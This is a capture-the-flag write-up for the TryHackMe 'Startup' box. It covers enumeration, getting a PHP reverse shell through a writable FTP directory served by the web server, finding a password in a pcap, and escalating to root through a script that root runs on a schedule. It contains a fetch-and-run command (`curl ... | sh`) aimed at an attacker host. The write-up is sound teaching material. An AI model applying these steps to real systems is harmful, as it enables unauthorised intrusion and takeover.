# THM Startup Writeup

​		August 10<sup>th</sup> 2023

​		writeups@securitymidwest.net

​		[Box Link](https://tryhackme.com/jr/startup)

 
## Skills Needed or Learned
1. Web Service Enumeration.
1. Cracking an encrypted zip file.
1. Linux Privesc with Permission Misconfiguration


### Description:


### Difficulty: Easy

# Hosts File

`sudo nano /etc/hosts`

add a line with the remote IP and the dns entry


`<IP> startup.thm`

# Enumeration

We started with a basic Nmap scan of the first 1000 ports

`nmap -v startup.thm`

![image](https://github.com/eatinsundip/Writeups/assets/43767555/ec8bf7e5-0fd9-428f-9a18-fd9610a21746)

From here I did a deeper scan of the returned open ports.

I opt to do a deeper scan after I discover what is open to save a lot of time trying to deep scan ports that aren't even open.

`sudo nmap -p 21,22,80 -A -sC -sV startup.thm`

![image](https://github.com/eatinsundip/Writeups/assets/43767555/2c6291b6-7df3-4bff-98ff-ebc551c9aef0)

With this data we turn focus on FTP first.

There wasn't a ton to find but it was interesting and worth looking at.

We also enumerated a possible username for later.

![image](https://github.com/eatinsundip/Writeups/assets/43767555/b4507c4d-e3bb-460f-80a6-4853a9384aff)

No need right now to look into SSH on port 22 but it may be useful later.

I turn focus to http on Port 80.

The website is pretty basic and not built with anything interesting.

![image](https://github.com/eatinsundip/Writeups/assets/43767555/3fe2b5c0-7757-4bba-8c5b-abffb4819dd1)

Nikto also came back useless.

I start a gobuster to see if there were any interesting directories to investigate.

`gobuster dir -r -x php,txt,html -z -b 404,403 -t 80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u startup.thm`

![image](https://github.com/eatinsundip/Writeups/assets/43767555/7a9a516f-357f-4fe5-9d77-b77190cbb09f)

http://startup.thm/files is the same directoy as the ftp server. This could be a possible RCE if we can upload files.

![image](https://github.com/eatinsundip/Writeups/assets/43767555/af626315-d3fd-406c-9157-ef0bfa3ba007)

# Foothold

I tested an innocent php file to see if I could get it on and executed from the browser.

`<?php phpinfo();?>`

![image](https://github.com/eatinsundip/Writeups/assets/43767555/5977991c-be9c-49b1-a4d0-71e763d16018)

I couldn't drop it in root but I had permission in the ftp folder to write so I dropped it there!

![image](https://github.com/eatinsundip/Writeups/assets/43767555/a548ab2e-daee-41b2-92d9-1cddf3cdb6ae)

Just like that, php execution is working on the victim website.

![image](https://github.com/eatinsundip/Writeups/assets/43767555/44116ced-9075-4fde-8ee3-5166288d0efd)

Now I move to a malicious PHP file to get a full shell to the box.

I used `https://revshells.com` to easily build the reverse shell code.

![image](https://github.com/eatinsundip/Writeups/assets/43767555/49e4df16-c6bf-4d4c-9114-6782f1f10051)

Once the file was created I used ftp to upload the file to the ftp directory just like the innocent test file.

I then setup the listener on the attack box for the RCE.

![image](https://github.com/eatinsundip/Writeups/assets/43767555/d4c4d0e2-744d-4468-9460-d77b9c85078e)

Everything is ready for execution so I hit the PHP page and caugth a connection from the victim machine.

![image](https://github.com/eatinsundip/Writeups/assets/43767555/71756bee-05ec-4c82-991c-01fa05252ccc)

I dropped in as www-data so now it is time to do some privesc.

![image](https://github.com/eatinsundip/Writeups/assets/43767555/847b73a6-30b9-42f9-923f-30532b779ab5)

# Privilege Escalation

I poked around but pretty quyickly ran a linpeas instance to try to catch some low hanging fruit.

I dropped linpeas to my attackbox and hosted a temporary http server with python.

`sudo python -m http.server 80`

from the victim machine I then ran `curl -L <attackbox-IP>/linpeas.sh | sh` to run it from memory.

![image](https://github.com/eatinsundip/Writeups/assets/43767555/a4941dc6-d1ab-4c79-94ca-e6e8e5a0d513)

The most interesting thing I jumped to first were the interesting files and folders in the root directory.

One of these files contains the first flag for the room!

![image](https://github.com/eatinsundip/Writeups/assets/43767555/1980ba57-d91b-40df-981c-ac8bd1d474c9)

I dug through all these and I found:
1. Vagrant seems to be another user on the system buit the home directory is not accurate to the passwd file.
1. Recipe.txt contains the first flag for the room.
1. /incidents contained a pcap file I downloaded and inspected

![image](https://github.com/eatinsundip/Writeups/assets/43767555/d62df984-132e-4e74-81d6-18bd6dd990cc)

I moved this file into the FTP folder to grab it onto the attack box.

![image](https://github.com/eatinsundip/Writeups/assets/43767555/154db886-1d6a-407b-8e62-aa5a82691f2c)
![image](https://github.com/eatinsundip/Writeups/assets/43767555/758a22c0-5b95-434e-8b60-d9741873b97c)

Once the pcap file is opened in wireshark just rightclick over the packets and follow the tcp stream to recplicate my findings.

![image](https://github.com/eatinsundip/Writeups/assets/43767555/c49101ed-e8aa-4da9-b6e2-933122495646)

check through all the streams to see if there is anything interesting. (there is!)

![image](https://github.com/eatinsundip/Writeups/assets/43767555/9f76d834-0eb0-4bf5-9edd-cfef8b750d11)

I found a password in the tcp stream!

![image](https://github.com/eatinsundip/Writeups/assets/43767555/8ed9d6ac-ebee-4167-be2f-415d6a988f75)

My first thought is test this against known users on SSH.

Users that I know of right now.
1. Lennie
2. Vagrant
3. Maya

I tried all three over SSH and got in with Lennie's account and the password recovered from teh pcap file!

![image](https://github.com/eatinsundip/Writeups/assets/43767555/02183c28-e69c-4ba4-8b88-823b27ffb33a)

I then pulled the user.txt flag!

![image](https://github.com/eatinsundip/Writeups/assets/43767555/3dce37cf-4933-432a-9eee-ca138a6cb70f)

There were also more interesting files in Lennies directory.

![image](https://github.com/eatinsundip/Writeups/assets/43767555/2b6f3a4a-5918-4886-95fd-b98b138f588e)

Lennie talks about deleting the incident logs, it's too late for that Lennie!

I ran another instance of linpeas but this time from the perspective of Lennie's user account.

One of the very interesting things found was the bash script in /etc owned by Lennie.

![image](https://github.com/eatinsundip/Writeups/assets/43767555/832c9c96-5ae0-44c4-861f-a284e74e56ed)

I had a solid hunch that this may be getting called by root o a schedule.

Instead of running PSExec I decided to test myself.

I added a simple netcat call and started listning for it.

![image](https://github.com/eatinsundip/Writeups/assets/43767555/710c7b75-1f02-46e5-be44-09aa4a8a8aab)

I tested manually and then let it sit and wait for a scheduled call.

![image](https://github.com/eatinsundip/Writeups/assets/43767555/74d6f2fd-67bc-4857-9db9-4377e9680ef6)

It did make a schedule call but I needed to fix the rce code.

I paid another visit to https://revshells.com.

Here is the final script to try to get RCE from this schedule call.

![image](https://github.com/eatinsundip/Writeups/assets/43767555/8e53ebed-6b2b-4cf6-a7ee-fd3fad46fa44)

# ROOT!

I popped root and grabbed the final flag!

![image](https://github.com/eatinsundip/Writeups/assets/43767555/705e1876-e300-400e-bc2f-ff203b5b8d7e)
